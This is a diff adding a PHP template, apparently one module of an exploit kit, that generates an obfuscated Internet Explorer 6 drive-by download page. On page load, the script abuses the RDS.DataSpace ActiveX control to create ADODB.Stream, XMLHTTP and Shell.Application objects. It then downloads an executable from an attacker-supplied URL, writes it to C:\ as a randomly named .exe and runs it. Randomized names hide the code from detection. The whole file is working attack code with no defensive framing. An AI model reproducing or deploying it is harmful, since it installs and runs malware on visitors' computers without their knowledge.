@@ -1,0 +1,31 @@
+<?php
+	function ie6_adodb(){
+	GLOBAL $url, $rnd_var, $rnd_str;
+?>
+
+<body onload='<?=$rnd_var[1];?>()'>
+<DIV id='<?=$rnd_var[2];?>' style='display:none'><?=$url;?></DIV>
+
+</body>
+<script type="text/javascript">
+
+function <?=$rnd_var[1];?>(){
+var <?=$rnd_var[3];?> = document.createElement(<?=rnd_str("object");?>);
+<?=$rnd_var[3];?>.setAttribute("id",<?=rnd_str($rnd_var[3]);?>);
+<?=$rnd_var[3];?>.setAttribute(<?=rnd_str("classid");?>,<?=rnd_str("clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");?>);
+var <?=$rnd_var[4];?> = <?=$rnd_var[3];?>.CreateObject(<?=rnd_str("adodb.stream");?>,'');
+var <?=$rnd_var[5];?> = <?=$rnd_var[3];?>.CreateObject(<?=rnd_str("Shell.Application");?>,'');
+var <?=$rnd_var[6];?> = <?=$rnd_var[3];?>.CreateObject(<?=rnd_str("msxml2.XMLHTTP");?>,'');
+var <?=$rnd_var[7];?>;
+<?=$rnd_var[7];?>=document.getElementById("<?=$rnd_var[2];?>").innerText;
+<?=$rnd_var[6];?>.open(<?=rnd_str("GET");?>,<?=$rnd_var[7];?>,false);
+<?=$rnd_var[6];?>.send();
+<?=$rnd_var[4];?>.type = 1;
+<?=$rnd_var[4];?>.open();
+<?=$rnd_var[4];?>.Write(<?=$rnd_var[6];?>.responseBody);
+<?=$rnd_var[8];?> = "c:\\<?=$rnd_var[9];?>.exe";
+<?=$rnd_var[4];?>.SaveToFile(<?=$rnd_var[8];?>,2);
+eval(<?=rnd_str($rnd_var[5].".ShellExecute(".$rnd_var[8].");");?>);
+}
+</script>
+<?php } ?>
